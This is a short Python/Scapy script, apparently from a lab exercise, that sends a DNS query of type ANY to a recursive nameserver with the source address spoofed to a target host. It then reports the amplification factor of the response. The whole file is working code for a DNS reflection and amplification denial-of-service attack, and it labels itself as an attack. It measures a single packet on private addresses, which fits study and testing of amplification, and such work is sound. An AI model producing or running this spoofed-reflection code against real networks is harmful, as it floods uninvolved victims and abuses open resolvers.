from scapy.all import *
 
target     = "10.21.4.3" # Target host
nameserver = "10.21.4.1" # DNS server - here we'll target the recursor specifically 
domain     = "fakesite.com" # Some domain name like "google.com" etc.

print("Starting the amplification attack!")
ip  = IP(src=target, dst=nameserver) #Set up the IP portion
udp = UDP(dport=53) #We will be sending this over UDP
dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname=domain, qtype=255)) #Craft the DNS packet with qType=255, meaning that the "all" flag is enabled

request = (ip/udp/dns) #Create the entire request
 
query = sr1(request,verbose=False, timeout=8) #Send the request and receive a response

result_dict = { #struct with all the data we need from our response 
  'dns_destination':nameserver,
  'query_type':"All",
  'query_size':len(request),
  'response_size':len(query),
  'amplification_factor': ( len(query) / len(request) )
}

print(result_dict) 